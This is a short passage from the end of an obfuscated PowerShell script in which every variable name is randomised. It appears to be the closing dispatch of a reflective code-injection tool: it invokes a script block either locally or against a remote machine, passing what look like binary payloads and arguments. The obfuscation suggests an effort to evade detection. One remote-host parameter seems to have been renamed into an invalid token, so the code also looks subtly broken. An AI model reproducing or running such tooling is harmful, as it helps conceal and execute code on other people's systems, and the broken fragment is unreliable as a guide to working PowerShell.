	if ($ehnOWVQvGXKAGFe -eq $null -or $ehnOWVQvGXKAGFe -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $eaxHY99szInnbHG -ArgumentList @($fKmtReldlnsntbf, $SVJAqEBa9vxwmRA, "Void", 0, "", $yDmQaeYubI9INki)
	}
	else
	{
		Invoke-Command -ScriptBlock $eaxHY99szInnbHG -ArgumentList @($fKmtReldlnsntbf, $SVJAqEBa9vxwmRA, "Void", 0, "", $yDmQaeYubI9INki) -ehnOWVQvGXKAGFe $ehnOWVQvGXKAGFe
	}
}

Main
}

